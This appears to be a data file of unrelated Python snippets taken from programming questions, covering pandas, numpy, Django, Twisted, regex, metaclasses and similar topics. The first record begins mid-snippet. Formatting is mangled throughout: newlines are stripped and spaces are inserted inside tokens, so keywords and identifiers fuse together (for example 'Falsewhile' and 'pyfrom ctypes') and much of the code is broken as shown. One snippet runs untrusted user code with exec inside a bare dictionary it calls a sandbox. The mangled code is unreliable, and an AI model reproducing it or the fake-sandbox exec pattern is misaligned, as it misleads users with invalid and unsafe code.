//www.com.com ' ) c = AsyncHTTP ( 'http : //www.bom.com ' ) # c = AsyncHTTP ( 'http : //www.no-such-host.ru ' ) # ! this line breaks execution ! asyncore.loop ( )"
"re.sub ( `` a* ( ( ab ) * ) b '' , r '' \1 '' , `` aabb '' ) echo `` aabb '' | sed `` s/a*\ ( \ ( ab\ ) *\ ) b/\1/ ''"
"# The solution and tests are untrusted code passed in to the GAE app . solution = ' b=5'unittest = 'assertEqual ( b , 5 ) ' # Here is the doctest version as a reference . solution = ' b=5'doctest = ' > > > b \n 5 ' # Compile and exec the untrusted solution provided by the user . compiled = compile ( solution , 'submitted code ' , 'exec ' ) sandbox = { } exec compiled in sandbox # Compile and exec each of the docteststest_cases = doctest.DocTestParser ( ) .get_examples ( doctest ) for test in test_cases : if not test.want : exec test.source in sandbox"
"> > > import numbers > > > import numpy > > > a = numpy.int_ ( 0 ) > > > isinstance ( a , int ) False > > > isinstance ( a , numbers.Integral ) True > > > b = numpy.float_ ( 0 ) > > > isinstance ( b , float ) True > > > isinstance ( b , numbers.Real ) True"
"import pygame as pyfrom ctypes import windllimport ImageGrab , ImageSetWindowPos = windll.user32.SetWindowPospy.init ( ) def get_image ( ) : im = ImageGrab.grab ( ( 0,0 , window_x , window_y ) ) mode = im.mode size = im.size data = im.tobytes ( ) im = py.image.fromstring ( data , size , mode ) return imwindow_x = 1920window_y = 100background = py.Surface ( ( window_x , window_y ) ) background.blit ( get_image ( ) , ( 0,0 ) ) window_pos = ( 0,0 ) screen = py.display.set_mode ( ( window_x , window_y ) , py.HWSURFACE|py.NOFRAME ) SetWindowPos ( py.display.get_wm_info ( ) [ 'window ' ] , -1,0,0,0,0,0x0001 ) clock = py.time.Clock ( ) done = Falsewhile not done : for event in py.event.get ( ) : if event.type == py.QUIT : done = True screen.blit ( background , ( 0,0 ) ) py.display.flip ( ) clock.tick ( 30 ) py.quit ( )"
"class HessioFile : `` '' '' Represents a pyhessio file instance `` '' '' def __init__ ( self , filename=None , from_context_manager=False ) : if not from_context_manager : raise HessioError ( 'HessioFile can be only use with context manager ' ) @ contextmanagerdef open ( filename ) : `` '' '' ... `` '' '' hessfile = HessioFile ( filename , from_context_manager=True )"
"from numbers Realfrom decimal import Decimalprint ( isinstance ( Decimal ( 1 ) , Real ) ) # False"
"> > > ' { : { } . { } f } '.format ( 27.5 , 6 , 2 ) ' 27.50 '"
"Molecular weight = 43057.32 Residues = 391 Average Residue Weight = 110.121 Charge = -10.0Isoelectric Point = 4.8926Residue Number Mole % DayhoffStatA = Ala 24 6.138 0.714 B = Asx 0 0.000 0.000 C = Cys 9 2.302 0.794 Property Residues Number Mole % Tiny ( A+C+G+S+T ) 135 34.527Small ( A+B+C+D+G+N+P+S+T+V ) 222 56.777Aliphatic ( A+I+L+V ) 97 24.808 template = `` '' '' Molecular weight = { 0 } Residues = { 1 } Average Residue Weight = { 2 } Charge = { 3 } Isoelectric Point = { 4 } Residue Number Mole % DayhoffStatA = Ala { 4 } { 5 } { 6 } B = Asx { 7 } { 8 } { 9 } C = Cys { 10 } { 11 } { 12 } Property Residues Number Mole % Tiny ( A+C+G+S+T ) { 14 } { 15 } Small ( A+B+C+D+G+N+P+S+T+V ) { 16 } { 17 } Aliphatic ( A+I+L+V ) { 18 } { 19 } '' '' '' list_of_vars = Parse ( template , infile ) import reclass TemplateParser : def __init__ ( self , template ) : self.m_template = template.replace ( ' { } ' , r ' [ \s ] * ( [ \d\-\ . ] + ) [ \s ] * ' ) def ParseString ( self , filename ) : return re.findall ( self.m_template , filename , re.DOTALL|re.MULTILINE ) [ 0 ] template = `` '' '' Molecular weight = { } Residues = { } Average Residue Weight = { } Charge = { } Isoelectric Point = { } Residue Number Mole % DayhoffStatA = Ala { } { } { } B = Asx { } { } { } C = Cys { } { } { } Property Residues Number Mole % Tiny \ ( A\+C\+G\+S\+T\ ) { } { } Small \ ( A\+B\+C\+D\+G\+N\+P\+S\+T\+V\ ) { } { } Aliphatic \ ( A\+I\+L\+V\ ) { } { } '' '' '' `` sorry , but this version only supports 100 named groups '' AssertionError : sorry , but this version only supports 100 named groups"
"class AutoRegisteredMeta ( type ) : def __new__ ( metacls , name , bases , attrs ) : # ... ( omitted ) check if `` name '' has already been registered ... new_class = super ( ) .__new__ ( metacls , name , bases , attrs ) register_component ( name , new_class ( ) ) # RuntimeError ( super ( ) : empty __class__ cell ) return new_class class BaseComponent ( metaclass=AutoRegisteredMeta ) : def __init__ ( self ) : # do some work here ... class ComponentFoo ( BaseComponent ) : def __init__ ( self ) : super ( ) .__init__ ( ) # < -- - RuntimeError occurs here self.foo = 'bar ' # ! /usr/bin/env python3class AutoRegisteredMeta ( type ) : def __new__ ( metacls , name , bases , attrs ) : new_class = super ( ) .__new__ ( metacls , name , bases , attrs ) new_class ( ) # < -- - RuntimeError can occur here return new_classclass BaseComponent ( metaclass=AutoRegisteredMeta ) : def __init__ ( self ) : print ( `` BaseComponent __init__ ( ) '' ) class GoodComponent ( BaseComponent ) : def __init__ ( self ) : print ( `` GoodComponent __init__ ( ) '' ) class BadComponent ( BaseComponent ) : def __init__ ( self ) : print ( `` BadComponent __init__ ( ) '' ) super ( ) .__init__ ( ) # < -- - RuntimeError occurs because of this"
"class MySerial ( ) : def __init__ ( self ) : pass # I have to have an __init__ def write ( self ) : pass # write to buffer def read ( self ) : pass # read to buffer def decorator ( self , func ) : def func_wrap ( *args , **kwargs ) : self.write ( func ( *args , **kwars ) ) return self.read ( ) return func_wrapclass App ( ) : def __init__ ( self ) : self.ser = MySerial ( ) @ self.ser.decorator # < -- does not work here . def myfunc ( self ) : # 'yummy_bytes ' is written to the serial buffer via # MySerial 's decorator method return 'yummy_bytes'if __name__ == '__main__ ' : app = App ( )"
"python my_script.py > output.csv & python my_script.py & > output.csv print ( 'hello , this is a test ' ) f = open ( 'output.csv ' , ' a ' ) f.write ( 'hello , this is a test ' )"
"a = [ array ( [ [ ' x ' , ' y ' , ' k ' ] , [ 'd ' , ' 2 ' , ' z ' ] , [ ' a ' , '15 ' , ' r ' ] ] , dtype='|S2 ' ) , array ( [ [ ' p ' , '49 ' ] , [ ' l ' , ' n ' ] ] , dtype='|S2 ' ) , array ( [ [ ' 5 ' , ' y ' ] , [ '33 ' , ' u ' ] , [ ' v ' , ' z ' ] ] , dtype='|S2 ' ) , array ( [ [ ' f ' , ' i ' ] , [ ' c ' , 'm ' ] , [ ' u ' , '98 ' ] ] dtype='|S2 ' ) ] b = x ! y.d ! 2.a ! 15 * x ! k.d ! z.a ! r , p ! 49.l ! n , 5 ! y.33 ! u.v ! z , f ! i.c ! m.u ! 98 # x # y # k # d # 2 # z # a # 15 # r temp = [ ] for c in a : temp = a [ 0 : ] b = `` * `` .join ( `` . '' .join ( var1+ '' ! `` +var2 for var1 , var2 in zip ( temp , a ) for row in a ) print bprint `` , ``"
"import pandasimport numpy as npimport timeitn=10000000mdt = pandas.DataFrame ( ) mdt [ ' A ' ] = np.random.choice ( range ( 10000,45000,1000 ) , n ) mdt [ ' B ' ] = np.random.choice ( range ( 10,400 ) , n ) mdt [ ' C ' ] = np.random.choice ( range ( 1,150 ) , n ) mdt [ 'D ' ] = np.random.choice ( range ( 10000,45000 ) , n ) mdt [ ' x ' ] = np.random.choice ( range ( 400 ) , n ) mdt [ ' y ' ] = np.random.choice ( range ( 25 ) , n ) test_A = 25000test_B = 25test_C = 40test_D = 35000eps_A = 5000eps_B = 5eps_C = 5eps_D = 5000f1 = lambda : mdt.query ( ' @ test_A- @ eps_A < = A < = @ test_A+ @ eps_A & ' + ' @ test_B- @ eps_B < = B < = @ test_B+ @ eps_B & ' + ' @ test_C- @ eps_C < = C < = @ test_C+ @ eps_C & ' + ' @ test_D- @ eps_D < = D < = @ test_D+ @ eps_D ' ) len ( f1 ( ) ) Out [ 289 ] : 1848 timeit.timeit ( f1 , number=10 ) /10Out [ 290 ] : 0.10734589099884033 mdt2 = mdt.set_index ( [ ' A ' , ' B ' , ' C ' , 'D ' ] ) .sortlevel ( ) f2 = lambda : mdt2.loc [ ( slice ( test_A-eps_A , test_A+eps_A ) , slice ( test_B-eps_B , test_B+eps_B ) , slice ( test_C-eps_C , test_C+eps_C ) , slice ( test_D-eps_D , test_D+eps_D ) ) , : ] len ( f2 ( ) ) Out [ 299 ] : 1848 timeit.timeit ( f2 , number=10 ) /10Out [ 295 ] : 7.335134506225586"
"class derivedset1 ( frozenset ) : def __new__ ( cls , *args ) : return frozenset.__new__ ( cls , args ) class derivedset2 ( set ) : def __new__ ( cls , *args ) : return set.__new__ ( cls , args ) a=derivedset1 ( 'item1 ' , 'item2 ' ) # WORKS b=derivedset2 ( 'item1 ' , 'item2 ' ) # DOES N'T WORKTraceback ( most recent call last ) : File `` inheriting-behaviours.py '' , line 12 , in < module > b=derivedset2 ( 'item1 ' , 'item2 ' ) # DOES N'T WORKTypeError : derivedset2 expected at most 1 arguments , got 2"
"[ ( 1 , 2 ) , # 1st entry ( 1 , 3 ) , # 2nd entry ( 1 , 4 ) , # 3rd entry ( 1 , 5 ) , # 4th entry ( 2 , 3 ) , # 5th entry ( 2 , 4 ) , # 6th entry ( 2 , 5 ) , # 7th entry ( 3 , 4 ) , # 8th entry ( 3 , 5 ) , # 9th entry ( 4 , 5 ) ] # 10th entry ( 4 , 5 ) > > > from itertools import combinations > > > it = combinations ( [ 1 , 2 , 3 , 4 , 5 ] , 2 ) > > > next ( it ) ( 1 , 2 ) > > > next ( it ) ( 1 , 3 ) > > > next ( it ) ( 1 , 4 ) > > > next ( it ) ( 1 , 5 )"
"def testFunc ( row , dfOther ) : for index , rowOther in dfOther.iterrows ( ) : if row [ ' A ' ] == rowOther [ 0 ] and row [ ' B ' ] == rowOther [ 1 ] : return dfOther.at [ index , ' C ' ] df [ 'OTHER ' ] = df.apply ( testFunc , args= ( dfOther ) , axis = 1 ) ValueError : The truth value of a DataFrame is ambiguous . Use a.empty , a.bool ( ) , a.item ( ) , a.any ( ) or a.all ( ) . def priorTestFunc ( row , dfOne , dfTwo ) : for index , rowOne in dfOne.iterrows ( ) : if row [ ' A ' ] == rowOne [ 0 ] and row [ ' B ' ] == rowOne [ 1 ] : return dfTwo.at [ index , ' C ' ] df [ 'OTHER ' ] = df.apply ( testFunc , args= ( dfOne , dfTwo ) , axis = 1 ) def testFunc ( row , dfOther , _ ) : for index , rowOther in dfOther.iterrows ( ) : if row [ ' A ' ] == rowOther [ 0 ] and row [ ' B ' ] == rowOther [ 1 ] : return dfOther.at [ index , ' C ' ] df [ 'OTHER ' ] = df.apply ( testFunc , args= ( dfOther , _ ) , axis = 1 ) dfOut [ 10 ] : A B C0 foo bur 60001 foo bur 70002 foo bur 80003 bar kek 90004 bar kek 100005 bar kek 11000dfOtherOut [ 12 ] : A B C0 foo bur 10001 foo bur 20002 foo bur 30003 bar kek 40004 bar kek 50005 bar kek 6000"
"( A , B , C , D , E , F , G , H , I ) scores : ( A , B , C , D ) = .99 ( A , B , C , E ) = .77 ( A , B , E ) = .66 ( G , ) = 1 ( I , ) = .03 ( H , I ) = .55 ( I , H ) = .15 ( E , F , G ) = .79 ( B , ) = .93 ( A , C ) = .46 ( D , ) = .23 ( D , F , G ) = .6 ( F , G , H ) = .34 ( H , ) = .09 ( Y , Z ) = 1 A B C E + D F G + H I = .77 * .6 * .55 = 0.2541 A B C D + E F G + H + I = .99 * .79 * .09 * .03 = 0.00211167 A B C E + E F G + D + H I"
"from imdb import IMDbia = IMDb ( ) actor_results = ia.get_person_filmography ( '0001098 ' ) actor_results [ 'data ' ] [ 'filmography ' ] [ 0 ] [ 'actor ' ] [ 0 ] < Movie id:0179803 [ http ] title : _Angels with Angles ( 2005 ) _ > In : results [ 'data ' ] [ 'filmography ' ] [ 0 ] [ 'actor ' ] [ 0 ] .items ( ) Out : [ ( 'title ' , 'Angels with Angles ' ) , ( 'kind ' , 'movie ' ) , ( 'year ' , 2005 ) , ( 'canonical title ' , 'Angels with Angles ' ) , ( 'long imdb title ' , 'Angels with Angles ( 2005 ) ' ) , ( 'long imdb canonical title ' , 'Angels with Angles ( 2005 ) ' ) , ( 'smart canonical title ' , 'Angels with Angles ' ) , ( 'smart long imdb canonical title ' , 'Angels with Angles ( 2005 ) ' ) ]"
"def norm_corr ( x , y , mode='valid ' ) : ya=np.array ( y ) slices= [ x [ pos : pos+len ( y ) ] for pos in range ( len ( x ) -len ( y ) +1 ) ] return [ np.linalg.norm ( np.array ( z ) -ya ) for z in slices ] similarities= [ norm_corr ( arr , pointarray ) for arr in arraytable ]"
ticx = 0.23 ; for i = 1:100000000 x = 4 * x * ( 1 - x ) ; endtocx Elapsed time is 0.603583 seconds.x = 0.947347510922557 import timet = time.time ( ) x = 0.23for i in range ( 100000000 ) : x = 4 * x * ( 1 - x ) elapsed = time.time ( ) - tprint ( elapsed ) print ( x ) 49.781250.9473475109225565 Elapsed time is 5.599789 seconds.1.643573442831396e-004 8.6099998950958250.00016435734428313955 t = time.time ( ) x = 0.23i = 0while ( i < 1000000000 ) : x = 4 * x * ( 1 - x ) i += 1elapsed = time.time ( ) - telapsedx 8.2189998626708980.00016435734428313955
from numpy import *print 'NumPy imported succesfully ! '
def get_query ( ) : # returns the query string passdef make_request ( query ) : # makes and returns the request with query passdef make_api_call ( request ) : # calls the api and returns response passdef process_response ( response ) : # process the response and returns the details passdef populate_database ( details ) : # populates the database with the details and returns the status of population passdef log_status ( status ) : # logs the status so that developer knows whats happening passquery = get_query ( ) request = make_request ( query ) response = make_api_call ( request ) details = process_response ( response ) status = populate_database ( details ) log_status ( status )
"from twisted.internet import reactorfrom mylib import MessageSFactorydef send_message ( message ) : reactor.connectTCP ( `` localhost '' , 8080 , MessageCFactory ( message ) ) reactor.listenTCP ( 8080 , MessageSFactory ( ) ) reactor.connectTCP ( `` localhost '' , 8080 , MessageCFactory ( `` this message gets received '' ) ) reactor.run ( ) send_message ( `` this message does n't '' ) from Tkinter import *def send_message ( ) : print ( `` message : % s '' % ( e1.get ( ) ) ) master = Tk ( ) Label ( master , text= '' Message '' ) .grid ( row=0 ) e1 = Entry ( master ) e1.grid ( row=0 , column=1 ) Button ( master , text='Send ' , command=send_message ) .grid ( row=3 , column=1 , sticky=W , pady=4 ) mainloop ( )"
"> > > ninety_five_same ( [ 1,1,1,1,1,1,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 ] ) True > > > ninety_five_same ( [ 1,1,1,1,1,1,2,1 ] ) # only 80 % the sameFalse"
"class Image ( models.Model ) : image_meta = models.ForeignKey ( 'Image_Meta ' , on_delete=models.CASCADE , ) image_path = models.URLField ( max_length=200 ) order = models.IntegerField ( ) version = models.CharField ( max_length=10 ) class ImageSerializer ( serializers.ModelSerializer ) : class Meta : model = Image field = ( 'id ' , 'image_path ' , 'order ' , 'version ' ) class ImageList ( generics.ListCreateAPIView ) : queryset = Image.objects.all ( ) serializer_class = ImageSerializerclass ImageDetail ( generics.RetrieveUpdateDestroyAPIView ) : queryset = Image.objects.all ( ) serializer_class = ImageSerializer url ( r'^image/ $ ' , views.ImageList.as_view ( ) , name='image_list ' ) , url ( r'^image/ ( ? P < pk > [ 0-9 ] + ) / $ ' , views.ImageDetail.as_view ( ) , name='image_detail ' )"
"class Thing ( Base ) : __tablename__ = 'things ' id = Column ( Integer ( ) , primary_key=True ) data = Column ( JSONEncodedDict ) raw_data = Column ( `` data '' , VARCHAR )"
"[ '50 ' , '56 ' , '568 ' ] edge_list = { frozenset ( { '568 ' , '56 ' } ) , frozenset ( { '56 ' , '50 ' } ) , frozenset ( { '50 ' , '568 ' } ) } g = grt.Graph ( directed=False ) edge_list = { frozenset ( { '568 ' , '56 ' } ) , frozenset ( { '56 ' , '50 ' } ) , frozenset ( { '50 ' , '568 ' } ) } ids = [ '50 ' , '56 ' , '568 ' ] g.add_edge_list ( edge_list , hashed=True , string_vals=True ) print ( g.vertex ( '50 ' ) ) ValueError : Invalid vertex index : 50 g = grt.Graph ( directed=False ) g.add_vertex ( len ( ids ) ) vprop = g.new_vertex_property ( `` string '' , vals=ids ) g.vp.user_id = vprop for vert1 , vert2 in edges_list : g.add_edge ( g.vertex ( ids_dict [ vert1 ] ) , g.vertex ( ids_dict [ vert2 ] ) )"
def three_print ( ) : yield yield yield
"@ csrf_exemptdef send_notification ( request ) : message = { `` name '' : `` xxxxx '' , '' email '' : `` xxxxxx @ gmail.com '' } registration_ids = [ 'xxxxxxxxxxxxxx ' ] post_data = { `` data '' : message , '' registration_ids '' : registration_ids } headers = { 'Content-Type ' : 'application/json ' , 'Authorization ' : 'key=xxxxxx ' } import requests post_response = requests.post ( url='https : //android.googleapis.com/gcm/send ' , data=simplejson.dumps ( post_data ) , headers=headers ) print post_response print simplejson.dumps ( [ post_response.headers , post_response.text ] ) to_json = { 'status ' : str ( post_response ) } return HttpResponse ( simplejson.dumps ( to_json ) , mimetype='application/json ' ) [ error ] < Response [ 401 ] > TypeError at /send_notification/CaseInsensitiveDict ( { `` alternate-protocol '' : `` 443 : quic '' , `` x-xss-protection '' : `` 1 ; mode=block '' , `` x-content-type-options '' : `` nosniff '' , `` transfer-encoding '' : `` chunked '' , `` expires '' : `` Fri , 08 Nov 2013 10:29:45 GMT '' , `` server '' : `` GSE '' , `` cache-control '' : `` private , max-age=0 '' , `` date '' : `` Fri , 08 Nov 2013 10:29:45 GMT '' , `` x-frame-options '' : `` SAMEORIGIN '' , `` content-type '' : `` text/html ; charset=UTF-8 '' } ) is not JSON serializable"
pip install -- index http : //pypi.MYSITE.com/simple/ -- upgrade PACKAGENAME
"Date WeekNum Public_Holiday1/1/2015 1 12/1/2015 1 03/1/2015 1 04/1/2015 1 05/1/2015 1 06/1/2015 1 07/1/2015 1 08/1/2015 2 09/1/2015 2 010/1/2015 2 011/1/2015 2 012/1/2015 2 013/1/2015 2 0 Date WeekNum Public_Holiday Public_Holiday_Week1/1/2015 1 1 12/1/2015 1 0 13/1/2015 1 0 14/1/2015 1 0 15/1/2015 1 0 16/1/2015 1 0 17/1/2015 1 0 18/1/2015 2 0 09/1/2015 2 0 010/1/2015 2 0 011/1/2015 2 0 012/1/2015 2 0 013/1/2015 2 0 0 df [ 'Public_Holiday_Week ' ] = np.where ( df [ 'Public_Holiday ' ] ==1,1,0 )"
"order = [ ' w ' , ' x ' , ' a ' , ' z ' ] [ ( object , ' a ' ) , ( object , ' x ' ) , ( object , ' z ' ) , ( object , ' a ' ) , ( object , ' w ' ) ]"
Python Client with properties : asynchronous : 0 cluster : [ 1×1 py.distributed.deploy.local.LocalCluster ] get_futures_error : [ 1×1 py.method ] coroutines : [ 1×1 py.list ] scheduler_file : [ 1×1 py.NoneType ] loop : [ 1×1 py.tornado.platform.select.SelectIOLoop ] recreate_error_locally : [ 1×1 py.method ] refcount : [ 1×1 py.collections.defaultdict ] extensions : [ 1×1 py.dict ] scheduler : [ 1×1 py.distributed.core.rpc ] rpc : [ 1×1 py.distributed.core.ConnectionPool ] futures : [ 1×1 py.dict ] scheduler_comm : [ 1×1 py.distributed.batched.BatchedSend ] status : [ 1×7 py.str ] connection_args : [ 1×1 py.dict ] id : [ 1×43 py.str ] generation : [ 1×1 py.int ] io_loop : [ 1×1 py.tornado.platform.select.SelectIOLoop ] security : [ 1×1 py.distributed.security.Security ] < Client : scheduler='tcp : //127.0.0.1:59795 ' processes=4 cores=4 > Undefined variable `` py '' or class `` py.sklearn.cluster.dbscan '' .
> > > sys.getsizeof ( { } ) 140 > > > sys.getsizeof ( { 'Hello ' : 'World ' } ) 140 > > > > > > yet_another_dict = { } > > > for i in xrange ( 5000 ) : yet_another_dict [ i ] = i**2 > > > > > > sys.getsizeof ( yet_another_dict ) 98444
> > b=1+2b = 3 > > b=1+2 ; > > In [ 32 ] : b=1+2In [ 33 ] : bOut [ 33 ] : 3
a b x1 1 311 2 11 3 421 4 4231 5 421 6 31 7 441 8 654371 9 732 1 56562 2 72 3 52 4 52 5 34
5Y3M == 5.255Y == 5.06M == 0.510Y11M = 10.91666..3Y14M = raise ValueError ( `` string ' % s ' can not be parsed '' % input_string ) def parse_aYbM ( maturity_code ) : maturity = 0 if `` Y '' in maturity_code : maturity += float ( maturity_code.split ( `` Y '' ) [ 0 ] ) if `` M '' in maturity_code : maturity += float ( maturity_code.split ( `` Y '' ) [ 1 ] .split ( `` M '' ) [ 0 ] ) / 12 return maturity elif `` M '' in maturity_code : return float ( maturity_code [ : -1 ] ) / 12 else : return 0
def main ( ) : # TODO : main application entry point passdef cleanup ( ) : # TODO : release system resources here passif __name__ == `` __main__ '' : try : main ( ) except : cleanup ( ) raise
df = df [ df [ mylist [ 0 ] ] | df [ mylist [ 1 ] ] | df [ mylist [ 2 ] ] ]
"> > > import PIL > > > image = PIL.Image.new ( ' 1 ' , ( 100,100 ) , 0 ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'module ' object has no attribute 'Image ' > > > from PIL import * > > > image = Image.new ( ' 1 ' , ( 100,100 ) , 0 ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > NameError : name 'Image ' is not defined > > > from PIL import Image > > > image = Image.new ( ' 1 ' , ( 100,100 ) , 0 ) > > > image < PIL.Image.Image image mode=1 size=100x100 at 0xB6C10F30 > > > > # works ..."
"a = [ 0 , 0 ] i = 0 a [ i ] = i = 1 print ( a , i ) a = [ 0 , 0 ] i = 0 i = a [ i ] = 1 print ( a , i ) [ 0 , 1 ] 1 [ 1 , 0 ] 1 [ 1 , 0 ] 1 [ 0 , 1 ] 1"
"container_commands : 01_makeAppMigrations : command : `` django-admin.py makemigrations '' leader_only : true 02_migrateApps : command : `` django-admin.py migrate '' leader_only : true 03_create_superuser_for_django_admin : command : `` django-admin.py createfirstsuperuser '' leader_only : true 04_collectstatic : command : `` django-admin.py collectstatic -- noinput '' 2020-06-18 04:01:49,965 P18083 [ INFO ] Config postbuild_0_DjangoApp_smt_prod2020-06-18 04:01:49,991 P18083 [ INFO ] ============================================================2020-06-18 04:01:49,991 P18083 [ INFO ] Test for Command 01_makeAppMigrations2020-06-18 04:01:49,995 P18083 [ INFO ] Completed successfully.2020-06-18 04:01:49,995 P18083 [ INFO ] ============================================================2020-06-18 04:01:49,995 P18083 [ INFO ] Command 01_makeAppMigrations2020-06-18 04:01:49,998 P18083 [ INFO ] -- -- -- -- -- -- -- -- -- -- -- -Command Output -- -- -- -- -- -- -- -- -- -- -- -2020-06-18 04:01:49,998 P18083 [ INFO ] /bin/sh : django-admin.py : command not found2020-06-18 04:01:49,998 P18083 [ INFO ] -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- 2020-06-18 04:01:49,998 P18083 [ ERROR ] Exited with error code 127"
"volterra├── setup.py└── volterra ├── __init__.py ├── integral.f90 ├── test │ ├── __init__.py │ └── test_volterra.py └── volterra.f90 def configuration ( parent_package= '' , top_path=None ) : from numpy.distutils.misc_util import Configuration config = Configuration ( 'volterra ' , parent_package , top_path ) config.add_extension ( '_volterra ' , sources= [ 'volterra/integral.f90 ' , 'volterra/volterra.f90 ' ] ) return configif __name__ == '__main__ ' : from numpy.distutils.core import setup setup ( **configuration ( top_path= '' ) .todict ( ) ) build/lib.linux-x86_64-2.7/└── volterra └── _volterra.so"
"def simpleGradient ( xrel , yrel ) : r = xrel*256 g = yrel*256 b = 0 return [ r , g , b ]"
"timeout = 1 host = ' 0.tcp.ngrok.io ' port = '7145 ' channel = grpc.insecure_channel ( ' { 0 } : { 1 } '.format ( host , port ) ) try : grpc.channel_ready_future ( channel ) .result ( timeout=timeout ) except grpc.FutureTimeoutError : sys.exit ( 1 ) stub = stub ( channel )"
@ given ( strategies.lists ( strategies.floats ( ) ) )
"df = pd.DataFrame ( ) df [ 'ind ' ] = [ 111 , 222 , 333 , 444 , 555 , 666 , 777 , 888 ] df [ 'ind1 ' ] = [ 111 , 444 , 222 , 555 , 777 , 333 , 666 , 777 ] def mult ( elem1 , elem2 ) : return elem1 * elem2if __name__ == '__main__ ' : pool = Pool ( processes=4 ) print ( pool.map ( mult , df.ind.astype ( int ) .values.tolist ( ) , df.ind1.astype ( int ) .values.tolist ( ) ) ) pool.terminate ( ) TypeError : unsupported operand type ( s ) for // : 'int ' and 'list '"
"dataset_blend_train = np.zeros ( ( X.shape [ 0 ] , len ( clfs ) ) ) dataset_blend_test = np.zeros ( ( X_submission.shape [ 0 ] , len ( clfs ) ) )"
"output = `` Print- Customer '' output = `` Print : Customer '' server.sendmail ( fromaddr , toaddrs , msg )"
"> > > from itertools import chain > > > x = [ [ 1,2,3 ] , [ 3,4,5 ] , [ 1,7,8 ] ] > > > list ( set ( ) .union ( *x ) ) [ 1 , 2 , 3 , 4 , 5 , 7 , 8 ] > > > list ( set ( chain ( *x ) ) ) [ 1 , 2 , 3 , 4 , 5 , 7 , 8 ] from itertools import chainimport timeimport random # Dry run.x = [ [ random.choice ( range ( 10000 ) ) for i in range ( 10 ) ] for j in range ( 10 ) ] list ( set ( ) .union ( *x ) ) list ( set ( chain ( *x ) ) ) y_time = 0z_time = 0for _ in range ( 1000 ) : x = [ [ random.choice ( range ( 10000 ) ) for i in range ( 10 ) ] for j in range ( 10 ) ] start = time.time ( ) y = list ( set ( ) .union ( *x ) ) y_time += time.time ( ) - start # print 'list ( set ( ) .union ( *x ) ) : \t ' , y_time start = time.time ( ) z = list ( set ( chain ( *x ) ) ) z_time += time.time ( ) - start # print 'list ( set ( chain ( *x ) ) ) : \t ' , z_time assert sorted ( y ) == sorted ( z ) # print print y_time / 1000.print z_time / 1000 . 1.39586925507e-051.09834671021e-05 y_time = 0z_time = 0for _ in range ( 1000 ) : x = [ [ random.choice ( range ( 10000 ) ) for i in range ( 10 ) ] for j in range ( 10 ) ] start = time.time ( ) y = set ( ) .union ( *x ) y_time += time.time ( ) - start start = time.time ( ) z = set ( chain ( *x ) ) z_time += time.time ( ) - start assert sorted ( y ) == sorted ( z ) print y_time / 1000.print z_time / 1000 . 1.22241973877e-051.02684497833e-05"
"import numpy as np > > > np.nan < 0.0False > > > np.nan > 0.0False from pyspark.sql.functions import coldf = spark.createDataFrame ( [ ( np.nan , 0.0 ) , ( 0.0 , np.nan ) ] ) df.show ( ) # + -- -+ -- -+ # | _1| _2| # + -- -+ -- -+ # |NaN|0.0| # |0.0|NaN| # + -- -+ -- -+df.printSchema ( ) # root # | -- _1 : double ( nullable = true ) # | -- _2 : double ( nullable = true ) df.select ( col ( `` _1 '' ) > col ( `` _2 '' ) ) .show ( ) # + -- -- -- -- -+ # | ( _1 > _2 ) | # + -- -- -- -- -+ # | true| # | false| # + -- -- -- -- -+"
"libc = ctypes.CDLL ( ctypes.util.find_library ( ' c ' ) ) real_stdout = libc.fileno ( ctypes.c_void_p.in_dll ( libc , 'stdout ' ) ) if sys.stdout.fileno ( ) == real_stdout : ... # define stdout __stdoutp"
"> > > import Levenshtein > > > s1 = raw_input ( 'first word : ' ) first word : ATCGTAATACGATCGTACGACATCGCGGCCCTAGC > > > s2 = raw_input ( 'second word : ' ) first word : TACGAT > > > Levenshtein.distance ( s1 , s2 ) 29 def find_tag ( pattern , text , errors ) : m = len ( pattern ) i=0 min_distance=errors+1 while i < =len ( text ) -m : distance = Levenshtein.distance ( text [ i : i+m ] , pattern ) print text [ i : i+m ] , distance # to see all matches . if distance < =errors : if distance < min_distance : match= [ i , distance ] min_distance=distance i+=1 return match # Real example . In this case just looking for one pattern , but we have about 50.import re , Levenshteintext = 'GACTAGCACTGTAGGGATAACAATTTCACACAGGTGGACAATTACATTGAAAATCACAGATTGGTCACACACACATTGGACATACATAGAAACACACACACATACATTAGATACGAACATAGAAACACACATTAGACGCGTACATAGACACAAACACATTGACAGGCAGTTCAGATGATGACGCCCGACTGATACTCGCGTAGTCGTGGGAGGCAAGGCACACAGGGGATAGG ' # Example of a recordpattern = 'TGCACTGTAGGGATAACAAT ' # distance 1errors = 2 # max errors allowedmatch = re.search ( pattern , text ) if match : print [ match.start ( ) ,0 ] # First we look for exact matchelse : find_tag ( pattern , text , errors )"
"import typingdef a ( x : int , y : int ) - > int : return x + yclass F ( object ) : def b ( self , x : int , y : int ) - > int : return x + ydef call ( operation : typing.Callable [ [ int , int ] , int ] ) - > int : return operation ( 2 , 2 ) call ( a ) f = F ( ) call ( f.b )"
precision recall f1-score support 1 0.63 0.96 0.76 23 2 0.96 0.64 0.77 36avg / total 0.83 0.76 0.76 59
"rate , data = scipy.io.wavfile.read ( filename )"
"from itertools import productimport pandas as pddf = pd.DataFrame.from_records ( product ( range ( 10 ) , range ( 10 ) ) ) df = df.sample ( 90 ) df.columns = `` c1 c2 '' .split ( ) df = df.sort_values ( df.columns.tolist ( ) ) .reset_index ( drop=True ) # c1 c2 # 0 0 0 # 1 0 1 # 2 0 2 # 3 0 3 # 4 0 4 # .. .. .. # 85 9 4 # 86 9 5 # 87 9 7 # 88 9 8 # 89 9 9 # # [ 90 rows x 2 columns ]"
os.chdir ( '~/google_drive/2014-11-05-QiimeAnalysis/quality_filtering/ ) FileNotFoundError : [ Errno 2 ] No such file or directory : '~/google_drive/2014-11-05-QiimeAnalysis/quality_filtering/ '
"def my_custom_strainer ( self , elem , attrs ) : for attr in attrs : print ( `` attr : '' + attr + `` = '' + attrs [ attr ] ) if elem == 'div ' and 'class ' in attr and attrs [ 'class ' ] == `` score '' : return True elif elem == `` span '' and elem.text == re.compile ( `` my text '' ) : return Truearticle_stat_page_strainer = SoupStrainer ( self.my_custom_strainer ) soup = BeautifulSoup ( html , features= '' html.parser '' , parse_only=article_stat_page_strainer ) elem == `` span '' and elem.text == re.compile ( `` my text '' ) AttributeError : 'str ' object has no attribute 'text '"
